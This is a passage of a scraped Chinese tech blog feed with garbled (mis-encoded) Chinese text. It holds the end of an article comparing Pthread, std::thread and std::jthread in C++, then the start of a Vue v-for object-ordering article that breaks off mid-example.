    <span class="hljs-comment">// é”™è¯¯å¤„ç†å¿…é¡»æ‰‹åŠ¨è¿›è¡Œ</span>
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Thread creation failed: %s\n"</span>, strerror(result));
}
</code></pre>
<h4 data-id="heading-3">2.2 èµ„æºç®¡ç†æ¨¡å‹</h4>
<p>Pthreadé‡‡ç”¨<strong>æ˜¾å¼ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>æ¨¡å‹ï¼š</p>
<ul>
<li>çº¿ç¨‹åˆ›å»ºä¸å±æ€§è®¾ç½®åˆ†ç¦»ï¼ˆpthread_create + pthread_attr_*ï¼‰</li>
<li>å¿…é¡»æ˜¾å¼è°ƒç”¨pthread_joinç­‰å¾…çº¿ç¨‹ç»“æŸæˆ–pthread_detachåˆ†ç¦»çº¿ç¨‹</li>
<li>æ‰€æœ‰åŒæ­¥å¯¹è±¡ï¼ˆäº’æ–¥é”ã€æ¡ä»¶å˜é‡ç­‰ï¼‰å¿…é¡»æ‰‹åŠ¨åˆå§‹åŒ–å’Œé”€æ¯</li>
<li>é”™è¯¯å¤„ç†é€šè¿‡è¿”å›å€¼è¿›è¡Œï¼Œæ— å¼‚å¸¸å®‰å…¨ä¿è¯</li>
</ul>
<p>è¿™ç§æ¨¡å‹èµ‹äºˆäº†ç¨‹åºå‘˜å¯¹çº¿ç¨‹æ ˆå¤§å°ã€è°ƒåº¦ç­–ç•¥ã€ç«äº‰ä½œç”¨åŸŸç­‰åº•å±‚å±æ€§çš„å®Œå…¨æ§åˆ¶ï¼Œä½†ä»£ä»·æ˜¯å¤æ‚çš„é”™è¯¯å¤„ç†å’Œèµ„æºæ³„æ¼é£é™©ã€‚</p>
<h3 data-id="heading-4">3. std::threadï¼šC++åŸç”Ÿçº¿ç¨‹çš„è¯ç”Ÿ</h3>
<h4 data-id="heading-5">3.1 RAIIèŒƒå¼ä¸ç±»å‹å®‰å…¨</h4>
<p>C++11çš„std::threadå°†çº¿ç¨‹æŠ½è±¡ä¸º<strong>å¯ç§»åŠ¨ä¸å¯å¤åˆ¶</strong>çš„èµ„æºå¥æŸ„ï¼Œé‡‡ç”¨RAIIï¼ˆèµ„æºè·å–å³åˆå§‹åŒ–ï¼‰èŒƒå¼ç®¡ç†çº¿ç¨‹ç”Ÿå‘½å‘¨æœŸï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// std::threadçš„RAIIè®¾è®¡</span>
<span class="hljs-function">std::thread <span class="hljs-title">t</span><span class="hljs-params">([](<span class="hljs-type">int</span> x) {
    std::cout &lt;&lt; <span class="hljs-string">"Thread executing with argument: "</span> &lt;&lt; x &lt;&lt; std::endl;
}, <span class="hljs-number">42</span>)</span></span>;

<span class="hljs-comment">// çº¿ç¨‹å¯¹è±¡ææ„æ—¶çš„è¡Œä¸º</span>
<span class="hljs-keyword">if</span> (t.<span class="hljs-built_in">joinable</span>()) {
    <span class="hljs-comment">// æœªè°ƒç”¨join()æˆ–detach()åˆ™è§¦å‘std::terminate()</span>
    t.<span class="hljs-built_in">join</span>();
}
</code></pre>
<h4 data-id="heading-6">3.2 ä¸æ ‡å‡†åº“çš„æ·±åº¦é›†æˆ</h4>
<p>std::threadä¸æ˜¯å­¤ç«‹ç‰¹æ€§ï¼Œè€Œæ˜¯C++å¹¶å‘æ¨¡å‹çš„æ ¸å¿ƒç»„ä»¶ï¼š</p>
<ul>
<li>ä¸std::mutexã€std::condition_variableç­‰åŒæ­¥åŸè¯­ååŒå·¥ä½œ</li>
<li>æ”¯æŒæ—¶é—´åº“ï¼ˆstd::chronoï¼‰è¿›è¡Œè¶…æ—¶æ“ä½œ</li>
<li>å¼‚å¸¸å®‰å…¨ï¼šæ„é€ å‡½æ•°åœ¨å¯åŠ¨çº¿ç¨‹å¤±è´¥æ—¶æŠ›å‡ºstd::system_error</li>
<li>å¯é€šè¿‡native_handle()è®¿é—®åº•å±‚å®ç°ï¼Œæä¾›å‘Pthreadçš„è¿ç§»è·¯å¾„</li>
</ul>
<h4 data-id="heading-7">3.3 å·²çŸ¥ç¼ºé™·</h4>
<p>std::threadçš„æ ¸å¿ƒè®¾è®¡ç¼ºé™·æ˜¯<strong>ææ„è¡Œä¸ºçš„ä¸å®‰å…¨æ€§</strong>ï¼šå¦‚æœjoinable()çš„çº¿ç¨‹å¯¹è±¡è¢«ææ„ï¼Œç¨‹åºè°ƒç”¨std::terminate()ã€‚è¿™è¿åäº†RAIIçš„"ææ„å‡½æ•°ä¸åº”å¤±è´¥"åŸåˆ™ï¼Œè¿«ä½¿ç¨‹åºå‘˜åœ¨å¼‚å¸¸å®‰å…¨æ€§å’Œæ­£ç¡®æ€§ä¹‹é—´åšå‡ºè‰°éš¾é€‰æ‹©ã€‚</p>
<h3 data-id="heading-8">4. std::jthreadï¼šçº¿ç¨‹å®‰å…¨æ€§çš„æœ€ç»ˆè§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-9">4.1 è‡ªåŠ¨ç”Ÿå‘½å‘¨æœŸç®¡ç†</h4>
<p>C++20çš„std::jthreadé€šè¿‡<strong>åœ¨ææ„å‡½æ•°ä¸­è‡ªåŠ¨è°ƒç”¨join()</strong> å½»åº•è§£å†³äº†std::threadçš„å®‰å…¨æ€§é—®é¢˜ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// jthreadçš„è‡ªåŠ¨joinè¡Œä¸º</span>
{
    <span class="hljs-function">std::jthread <span class="hljs-title">worker</span><span class="hljs-params">([] {
        std::this_thread::sleep_for(<span class="hljs-number">500</span>ms);
        std::cout &lt;&lt; <span class="hljs-string">"Work completed"</span> &lt;&lt; std::endl;
    })</span></span>;
    
    <span class="hljs-comment">// ä½œç”¨åŸŸç»“æŸï¼Œworkerææ„è‡ªåŠ¨è°ƒç”¨join()</span>
    <span class="hljs-comment">// æ— éœ€æ˜¾å¼ç­‰å¾…ï¼Œä¹Ÿä¸ä¼šç»ˆæ­¢ç¨‹åº</span>
} <span class="hljs-comment">// æ­¤å¤„é˜»å¡ç›´åˆ°workerçº¿ç¨‹å®Œæˆ</span>
</code></pre>
<h4 data-id="heading-10">4.2 åä½œå¼ä¸­æ–­æœºåˆ¶</h4>
<p>std::jthreadå¼•å…¥äº†<strong>åŸºäºstop_tokençš„æ ‡å‡†åŒ–ä¸­æ–­åè®®</strong>ï¼Œå–ä»£äº†æ˜“å‡ºé”™çš„è‡ªå®šä¹‰æ ‡å¿—å˜é‡æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// åä½œå¼ä¸­æ–­çš„æ ‡å‡†å®ç°</span>
<span class="hljs-function">std::jthread <span class="hljs-title">interruptible_worker</span><span class="hljs-params">([](std::stop_token token) {
    <span class="hljs-keyword">while</span> (!token.stop_requested()) {
        <span class="hljs-comment">// æ‰§è¡Œå¯ä¸­æ–­çš„ä»»åŠ¡</span>
        std::this_thread::sleep_for(<span class="hljs-number">100</span>ms);
    }
    <span class="hljs-comment">// æ¸…ç†èµ„æº</span>
    std::cout &lt;&lt; <span class="hljs-string">"Thread interrupted gracefully"</span> &lt;&lt; std::endl;
})</span></span>;

<span class="hljs-comment">// ä»å¤–éƒ¨è¯·æ±‚åœæ­¢</span>
interruptible_worker.<span class="hljs-built_in">request_stop</span>();
</code></pre>
<p>è¯¥æœºåˆ¶çš„æ ¸å¿ƒç»„ä»¶åŒ…æ‹¬ï¼š</p>
<ul>
<li>std::stop_tokenï¼šè½»é‡çº§ã€ä¸å¯å¤åˆ¶çš„è§‚å¯Ÿè€…å¯¹è±¡</li>
<li>std::stop_sourceï¼šæ‹¥æœ‰åœæ­¢çŠ¶æ€çš„æ‰€æœ‰æƒ</li>
<li>std::stop_callbackï¼šæ³¨å†Œåœæ­¢æ—¶çš„å›è°ƒå‡½æ•°</li>
<li>æ— æ•°æ®ç«äº‰çš„è®¾è®¡ä¿è¯ï¼Œå³ä½¿å¹¶å‘è°ƒç”¨ä¹Ÿä¿æŒä¸€è‡´æ€§</li>
</ul>
<h4 data-id="heading-11">4.3 æ€§èƒ½ä¸å…¼å®¹æ€§è€ƒé‡</h4>
<p>std::jthreadåœ¨åŠŸèƒ½å¢å¼ºçš„åŒæ—¶ä¿æŒäº†é›¶å¼€é”€æŠ½è±¡åŸåˆ™ï¼š</p>
<ul>
<li>è‡ªåŠ¨joinå¼•å…¥çš„å¾®å°è¿è¡Œæ—¶æˆæœ¬ä»…åœ¨ææ„æ—¶å‘ç”Ÿä¸€æ¬¡</li>
<li>stop_tokenæœºåˆ¶ä»…åœ¨è¯·æ±‚åœæ­¢æ—¶äº§ç”ŸåŸå­æ“ä½œå¼€é”€</li>
<li>å®Œå…¨å…¼å®¹std::threadçš„æ¥å£ï¼Œå¯æ— ç¼æ›¿æ¢ç°æœ‰ä»£ç </li>
<li>ä¿ç•™äº†native_handle()ç”¨äºå¹³å°ç‰¹å®šæ“ä½œ</li>
</ul>
<h3 data-id="heading-12">5. æŠ€æœ¯é€‰å‹å†³ç­–æ¡†æ¶</h3>
<p>é€‰æ‹©çº¿ç¨‹æ¨¡å‹åº”åŸºäºä»¥ä¸‹æŠ€æœ¯ç»´åº¦è¯„ä¼°ï¼š</p>





















































<table><thead><tr><th>è¯„ä¼°ç»´åº¦</th><th>Pthread</th><th>std::thread</th><th>std::jthread</th></tr></thead><tbody><tr><td><strong>è¯­è¨€è¦æ±‚</strong></td><td>çº¯Cæˆ–ä»»æ„C++</td><td>C++11åŠä»¥ä¸Š</td><td>C++20åŠä»¥ä¸Š</td></tr><tr><td><strong>å¹³å°ä¾èµ–</strong></td><td>Unix-likeåŸç”Ÿï¼ŒWindowséœ€ç§»æ¤å±‚</td><td>æ ‡å‡†C++å®ç°</td><td>æ ‡å‡†C++å®ç°</td></tr><tr><td><strong>ç”Ÿå‘½å‘¨æœŸå®‰å…¨</strong></td><td>å®Œå…¨æ‰‹åŠ¨ç®¡ç†</td><td>ææ„ä¸å®‰å…¨</td><td>è‡ªåŠ¨joinå®‰å…¨</td></tr><tr><td><strong>ä¸­æ–­æ”¯æŒ</strong></td><td>éœ€è‡ªå®šä¹‰å®ç°</td><td>éœ€è‡ªå®šä¹‰å®ç°</td><td>å†…ç½®æ ‡å‡†åŒ–æ”¯æŒ</td></tr><tr><td><strong>æ§åˆ¶ç²’åº¦</strong></td><td>å®Œå…¨æ§åˆ¶æ‰€æœ‰å±æ€§</td><td>å¹³å°æ— å…³æŠ½è±¡</td><td>å¹³å°æ— å…³æŠ½è±¡</td></tr><tr><td><strong>å¼‚å¸¸å®‰å…¨</strong></td><td>æ— å†…ç½®æ”¯æŒ</td><td>æ„é€ å‡½æ•°æŠ›å‡ºå¼‚å¸¸</td><td>æ„é€ å‡½æ•°æŠ›å‡ºå¼‚å¸¸</td></tr><tr><td><strong>ä»£ç å¤æ‚åº¦</strong></td><td>é«˜ï¼ˆçº¦10:1ä»£ç è†¨èƒ€æ¯”ï¼‰</td><td>ä¸­</td><td>ä½</td></tr></tbody></table>
<h4 data-id="heading-13">5.1 é€‰æ‹©Pthreadçš„æ˜ç¡®åœºæ™¯</h4>
<ol>
<li><strong>çº¯Cè¯­è¨€é¡¹ç›®</strong>ï¼šæ— C++è¿è¡Œæ—¶ç¯å¢ƒ</li>
<li><strong>éœ€è¦ç‰¹å®šè°ƒåº¦ç­–ç•¥</strong>ï¼šå¦‚SCHED_FIFOã€SCHED_RRå®æ—¶è°ƒåº¦</li>
<li><strong>æ§åˆ¶çº¿ç¨‹æ ˆç‰¹æ€§</strong>ï¼šè‡ªå®šä¹‰æ ˆå¤§å°ã€æ ˆåœ°å€æˆ–ä¿æŠ¤åŒºåŸŸ</li>
<li><strong>ä¸ç°æœ‰Pthreadä»£ç åº“é›†æˆ</strong>ï¼šé¿å…æ¥å£è½¬æ¢å¼€é”€</li>
</ol>
<h4 data-id="heading-14">5.2 é€‰æ‹©std::threadçš„é€‚ç”¨æ¡ä»¶</h4>
<ol>
<li><strong>C++11/14/17ä»£ç åº“å‡çº§</strong>ï¼šæ¸è¿›å¼ç°ä»£åŒ–æ”¹é€ </li>
<li><strong>éœ€è¦å¹³è¡¡æ§åˆ¶ä¸å®‰å…¨</strong>ï¼šå·²æœ‰è‰¯å¥½çš„RAIIåŒ…è£…åŸºç¡€è®¾æ–½</li>
<li><strong>å—é™çš„ç¼–è¯‘å™¨ç¯å¢ƒ</strong>ï¼šå°šæœªæ”¯æŒC++20ä½†æ”¯æŒC++11</li>
</ol>
<h4 data-id="heading-15">5.3 ä¼˜å…ˆé€‰æ‹©std::jthreadçš„ç°ä»£åœºæ™¯</h4>
<ol>
<li><strong>å…¨æ–°C++20+é¡¹ç›®</strong>ï¼šæ— éœ€è€ƒè™‘å‘åå…¼å®¹æ€§</li>
<li><strong>å®‰å…¨å…³é”®ç³»ç»Ÿ</strong>ï¼šé¿å…èµ„æºæ³„æ¼å’Œæœªå®šä¹‰è¡Œä¸º</li>
<li><strong>éœ€è¦ä¼˜é›…åœæ­¢æœºåˆ¶</strong>ï¼šæœåŠ¡å™¨ã€æœåŠ¡ã€é•¿æ—¶é—´è¿è¡Œä»»åŠ¡</li>
<li><strong>å›¢é˜Ÿåä½œé¡¹ç›®</strong>ï¼šå‡å°‘å› å¿˜è®°join()å¯¼è‡´çš„å´©æºƒ</li>
</ol>
<h3 data-id="heading-16">6. è¿ç§»ç­–ç•¥ä¸æŠ€æœ¯å€ºåŠ¡ç®¡ç†</h3>
<h4 data-id="heading-17">6.1 ä»Pthreadè¿ç§»åˆ°std::thread</h4>
<p>è¿ç§»åº”éµå¾ªé€æ­¥æ›¿æ¢åŸåˆ™ï¼š</p>
<ol>
<li><strong>å°è£…Pthreadè°ƒç”¨</strong>ï¼šåˆ›å»ºè¿‡æ¸¡æ€§RAIIåŒ…è£…å™¨</li>
<li><strong>æ›¿æ¢åˆ›å»ºé€»è¾‘</strong>ï¼šå°†pthread_createæ”¹ä¸ºstd::threadæ„é€ å‡½æ•°</li>
<li><strong>æ›¿æ¢åŒæ­¥åŸè¯­</strong>ï¼šä½¿ç”¨std::mutexç­‰æ ‡å‡†æ›¿ä»£å“</li>
<li><strong>å¤„ç†é”™è¯¯æœºåˆ¶</strong>ï¼šå°†è¿”å›å€¼æ£€æŸ¥æ”¹ä¸ºå¼‚å¸¸å¤„ç†</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è¿ç§»ç¤ºä¾‹ï¼šPthread â†’ std::thread</span>
<span class="hljs-comment">// æ—§çš„Pthreadä»£ç </span>
<span class="hljs-type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;
<span class="hljs-built_in">pthread_mutex_lock</span>(&amp;mutex);
<span class="hljs-comment">// ä¸´ç•ŒåŒº</span>
<span class="hljs-built_in">pthread_mutex_unlock</span>(&amp;mutex);

<span class="hljs-comment">// æ–°çš„std::threadä»£ç </span>
std::mutex mtx;
<span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(mtx)</span></span>;
<span class="hljs-comment">// å¼‚å¸¸å®‰å…¨çš„ä¸´ç•ŒåŒº</span>
</code></pre>
<h4 data-id="heading-18">6.2 ä»std::threadå‡çº§åˆ°std::jthread</h4>
<p>å‡çº§è¿‡ç¨‹å‡ ä¹æ˜¯é€æ˜çš„ï¼š</p>
<ol>
<li><strong>ç›´æ¥ç±»å‹æ›¿æ¢</strong>ï¼šå°†std::threadæ”¹ä¸ºstd::jthread</li>
<li><strong>ç§»é™¤æ˜¾å¼join/detachè°ƒç”¨</strong>ï¼šä¾èµ–è‡ªåŠ¨ææ„è¡Œä¸º</li>
<li><strong>å®ç°ä¸­æ–­æ„ŸçŸ¥</strong>ï¼šä¸ºçº¿ç¨‹å‡½æ•°æ·»åŠ stop_tokenå‚æ•°</li>
<li><strong>æµ‹è¯•ä¸­æ–­åœºæ™¯</strong>ï¼šéªŒè¯request_stop()çš„è¡Œä¸º</li>
</ol>
<h3 data-id="heading-19">7. æœªæ¥å±•æœ›ï¼šC++å¹¶å‘æ¨¡å‹çš„æŒç»­æ¼”è¿›</h3>
<p>C++æ ‡å‡†å§”å‘˜ä¼šä»åœ¨å®Œå–„å¹¶å‘æ¨¡å‹ï¼Œç›¸å…³è¿›å±•åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>C++26çš„std::execution</strong>ï¼šåŸºäºå‘é€å™¨å’Œæ¥æ”¶å™¨çš„å¼‚æ­¥ç¼–ç¨‹æ¡†æ¶</li>
<li><strong>å¢å¼ºçš„åŸå­æ“ä½œ</strong>ï¼šæ”¹è¿›çš„å†…å­˜æ¨¡å‹å’ŒåŸå­è§†å›¾</li>
<li><strong>ç¡¬ä»¶çº¿ç¨‹äº²å’Œæ€§</strong>ï¼šæ ‡å‡†åŒ–çš„CPUç»‘å®šæ¥å£</li>
<li><strong>åŠ¨æ€çº¿ç¨‹æ± </strong>ï¼šéšè´Ÿè½½è‡ªåŠ¨è°ƒæ•´çš„çº¿ç¨‹ç®¡ç†</li>
</ul>
<p>è¿™äº›æ¼”è¿›å°†è¿›ä¸€æ­¥ç®€åŒ–å®‰å…¨å¹¶å‘ç¼–ç¨‹ï¼Œä½†std::jthreadä½œä¸ºåŸºç¡€çº¿ç¨‹æŠ½è±¡ï¼Œå°†åœ¨å¯é¢„è§çš„æœªæ¥ä¿æŒæ ¸å¿ƒåœ°ä½ã€‚</p>
<h3 data-id="heading-20">8. ç»“è®º</h3>
<p>çº¿ç¨‹ç¼–ç¨‹æ¨¡å‹çš„æ¼”è¿›åæ˜ äº†è½¯ä»¶å·¥ç¨‹ä»"ä¿¡ä»»ç¨‹åºå‘˜"åˆ°"é˜²æ­¢ç¨‹åºå‘˜å‡ºé”™"çš„èŒƒå¼è½¬å˜ã€‚Pthreadæä¾›äº†åŸºç¡€ä½†å±é™©çš„æ§åˆ¶èƒ½åŠ›ï¼Œstd::threadå¼•å…¥äº†è¯­è¨€çº§æ”¯æŒä½†ä»å­˜åœ¨é™·é˜±ï¼Œstd::jthreadæœ€ç»ˆå®ç°äº†å®‰å…¨æ€§ä¸è¡¨è¾¾åŠ›çš„å¹³è¡¡ã€‚</p>
<p>æŠ€æœ¯é€‰å‹åº”åŸºäºé¡¹ç›®çº¦æŸè€Œéä¸ªäººåå¥½ï¼šé—ç•™ç³»ç»Ÿç»´æŠ¤å¯èƒ½éœ€è¦Pthreadï¼Œæ¸è¿›å¼ç°ä»£åŒ–é€‚åˆstd::threadï¼Œè€Œå…¨æ–°C++20+é¡¹ç›®åº”æ— æ¡ä»¶é€‰æ‹©std::jthreadã€‚æ— è®ºé€‰æ‹©å“ªç§æ¨¡å‹ï¼Œç†è§£å…¶è®¾è®¡å“²å­¦å’Œå†…åœ¨æƒè¡¡éƒ½æ˜¯ç¼–å†™æ­£ç¡®ã€é«˜æ•ˆå¹¶å‘ä»£ç çš„å‰æã€‚</p>
<h3 data-id="heading-21">å‚è€ƒæ–‡çŒ®</h3>
<ol>
<li>IEEE Std 1003.1c-1995, <em>POSIX.1c Threads Extension</em></li>
<li>ISO/IEC 14882:2011, <em>Programming Languages â€” C++</em> (C++11 Standard)</li>
<li>ISO/IEC 14882:2020, <em>Programming Languages â€” C++</em> (C++20 Standard)</li>
<li>Williams, A. (2019). <em>C++ Concurrency in Action</em> (2nd ed.). Manning Publications.</li>
<li>Boehm, H., &amp; Adve, S. V. (2008). <em>Foundations of the C++ concurrency memory model</em>. ACM SIGPLAN Notices.</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue v-for éå†å¯¹è±¡é¡ºåºå®Œå…¨æŒ‡å—ï¼šä»æ··ä¹±åˆ°å¯æ§]]></title>    <link>https://juejin.cn/post/7595341943338565642</link>    <guid>https://juejin.cn/post/7595341943338565642</guid>    <pubDate>2026-01-15T08:58:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595341943338565642" data-draft-id="7595365551607300147" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue v-for éå†å¯¹è±¡é¡ºåºå®Œå…¨æŒ‡å—ï¼šä»æ··ä¹±åˆ°å¯æ§"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-15T08:58:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue v-for éå†å¯¹è±¡é¡ºåºå®Œå…¨æŒ‡å—ï¼šä»æ··ä¹±åˆ°å¯æ§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:58:33.000Z" title="Thu Jan 15 2026 08:58:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue v-for éå†å¯¹è±¡é¡ºåºå®Œå…¨æŒ‡å—ï¼šä»æ··ä¹±åˆ°å¯æ§</h2>
<blockquote>
<p>Vue ä¸­ <code>v-for</code> éå†å¯¹è±¡çš„é¡ºåºé—®é¢˜ç»å¸¸è®©å¼€å‘è€…å›°æƒ‘ã€‚ä»Šå¤©æˆ‘ä»¬æ¥å½»åº•ææ‡‚å®ƒçš„éå†æœºåˆ¶ï¼Œå¹¶æŒæ¡å¤šç§ä¿è¯é¡ºåºçš„æ–¹æ³•ï¼</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€é—®é¢˜çš„æ ¸å¿ƒï¼šJavaScript å¯¹è±¡é¡ºåºçš„çœŸç›¸</h3>
<h4 data-id="heading-2">1.1 JavaScript å¯¹è±¡çš„æ— åºæ€§</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å®éªŒ1ï¼šJavaScript åŸç”Ÿå¯¹è±¡</span>
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-number">3</span>: <span class="hljs-string">'three'</span>,
  <span class="hljs-number">1</span>: <span class="hljs-string">'one'</span>,
  <span class="hljs-number">2</span>: <span class="hljs-string">'two'</span>
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(obj))  <span class="hljs-comment">// è¾“å‡ºä»€ä¹ˆï¼Ÿ</span>
<span class="hljs-comment">// ç»“æœæ˜¯ï¼š['1', '2', '3']ï¼æ•°å­—é”®è¢«æ’åºäº†ï¼</span>

<span class="hljs-comment">// å®éªŒ2ï¼šæ··åˆé”®å</span>
<span class="hljs-keyword">const</span> mixedObj = {
  <span class="hljs-attr">c</span>: <span class="hljs-string">'Charlie'</span>,
  <span class="hljs-attr">a</span>: <span class="hljs-string">'Alpha'</span>,
  <span class="hljs-number">2</span>: <span class="hljs-string">'Number 2'</span>,
  <span class="hljs-attr">b</span>: <span class="hljs-string">'Bravo'</span>,
  <span class="hljs-number">1</span>: <span class="hljs-string">'Number 1'</span>
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Object.keys:'</span>, <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(mixedObj))
